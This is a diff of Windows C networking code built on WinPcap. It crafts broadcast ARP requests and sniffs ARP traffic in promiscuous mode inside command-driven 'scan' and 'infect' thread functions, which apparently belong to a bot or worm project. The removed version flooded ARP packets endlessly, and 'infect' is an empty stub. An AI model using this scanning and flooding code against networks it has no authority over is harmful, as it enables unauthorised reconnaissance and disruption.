@@ -38,35 +38,26 @@ static void build_packet(u_char* packet, PIP_ADAPTER_INFO adapter)
 	arp_header = (arp_ether_ipv4*)(packet + sizeof(ether_hdr));
 	
 	//ETHERNET LAYER
-	ether_header->src_addr[0] = adapter->Address[0];
-	ether_header->src_addr[1] = adapter->Address[1];
-	ether_header->src_addr[2] = adapter->Address[2];
-	ether_header->src_addr[3] = adapter->Address[3];
-	ether_header->src_addr[4] = adapter->Address[4];
-	ether_header->src_addr[5] = adapter->Address[5];
-	
-	memset(ether_header->dest_addr, 0xff, ETH_ALEN);
-
-	ether_header->frame_type = htons(ETH_P_ARP);
+	memcpy(ether_header->src_addr, adapter->Address, ETH_ALEN); //this adapter's mac
+	memset(ether_header->dest_addr, 0xff, ETH_ALEN); //broadcast
+	ether_header->frame_type = htons(ETH_P_ARP); //LAYER3:ARP (0x0806)
 
 	//NETWORK LAYER
 	arp_header->htype = htons(ARP_HTYPE_ETHER);
 	arp_header->ptype = htons(ARP_PTYPE_IPv4);
 	arp_header->hlen = 6;
 	arp_header->plen = 4;
-	arp_header->op = htons(1);
+	arp_header->op = htons(1); // who has
 	memcpy(arp_header->sha, ether_header->src_addr, ETH_ALEN);
 	inet_pton(AF_INET, adapter->IpAddressList.IpAddress.String, &arp_header->spa);
 	memset(arp_header->tha, 0, ETH_ALEN);
-	//inet_pton(AF_INET, "192.168.8.254", &arp_header->tpa);
 }
 
 DWORD WINAPI scan(LPVOID lparam)
 {
 	pCommand command = (pCommand)lparam;
+	
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
-	PIP_ADAPTER_INFO adp_p; //adapter pointer
-	PIP_ADDR_STRING addr;
 	ULONG outBufLen;
 
 	GetAdaptersInfo(pAdapterInfo, &outBufLen);
@@ -75,36 +66,81 @@ DWORD WINAPI scan(LPVOID lparam)
 		return 1;
 	GetAdaptersInfo(pAdapterInfo, &outBufLen);
 
-	u_char packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
 	pcap_t* fp;
+	pcap_if_t* const alldevs, * temp;
+	struct pcap_addr* addr;
+	struct bpf_program fcode;
+	int res;
+	struct pcap_pkthdr* pkt_header;
+	const u_char* pkt_data;
+	ULONG32 netmask;
 
-	for (adp_p = pAdapterInfo; adp_p; adp_p = adp_p->Next)
+
+	pcap_findalldevs(&alldevs, NULL);
+	
+	for (temp = alldevs; temp; temp = temp->next)
 	{
-		char formatted_name[256] = "rpcap://\\Device\\NPF_";
-		strcat(formatted_name, adp_p->AdapterName);
-		for (addr = &adp_p->IpAddressList; addr; addr->Next)
-		{
-			fp = pcap_open(
-				formatted_name,
-				sizeof(packet),
-				PCAP_OPENFLAG_PROMISCUOUS,
-				1000,
-				NULL,
-				NULL
-			);
+		//open adapter
+		fp = pcap_open(
+			temp->name,
+			sizeof(ether_hdr) + sizeof(arp_ether_ipv4),
+			PCAP_OPENFLAG_PROMISCUOUS,
+			1000,
+			NULL,
+			NULL
+		);
 
-			build_packet(packet, adp_p);
-			while (1)
-			{
-				pcap_sendpacket(fp, packet, sizeof(packet));
-			}
-			break;
+		if (temp->addresses != NULL)
+			/* Retrieve the mask of the first address of the interface */
+			netmask = ((struct sockaddr_in*)(temp->addresses->netmask))->sin_addr.S_un.S_addr;
+		else
+			/* If the interface is without addresses we suppose to be in a C class network */
+			netmask = 0xffffff;
+
+		/*Filter arp packets only*/
+		if (pcap_compile(fp, &fcode, "arp", 1, netmask) < 0)
+		{
+			fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
+			/* Free the device list */
+			pcap_freealldevs(alldevs);
+			return -1;
 		}
+
+		/*Set the filter*/
+		if (pcap_setfilter(fp, &fcode) < 0)
+		{
+			fprintf(stderr, "\nError setting the filter.\n");
+			/* Free the device list */
+			pcap_freealldevs(alldevs);
+			return -1;
+		}
+
+		ether_hdr* ether_header;
+		arp_ether_ipv4* arp_header;
+		/* Retrieve the packets */
+		while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0) {
+
+			/* Timeout elapsed */
+			if (res == 0)
+				continue;
+
+			ether_header = (ether_hdr*)pkt_data;
+			arp_header = (arp_ether_ipv4*)(pkt_data + sizeof(ether_hdr));
+			
+		}
+
+		
+		//close adapter
+		pcap_close(fp);
 	}
+
+	free(pAdapterInfo);
+	pcap_freealldevs(alldevs);
+	
 	return 0;
 }
 
-static DWORD WINAPI infect(LPVOID lparam)
+DWORD WINAPI infect(LPVOID lparam)
 {
 	pCommand command = (pCommand)lparam;
 	return 0;
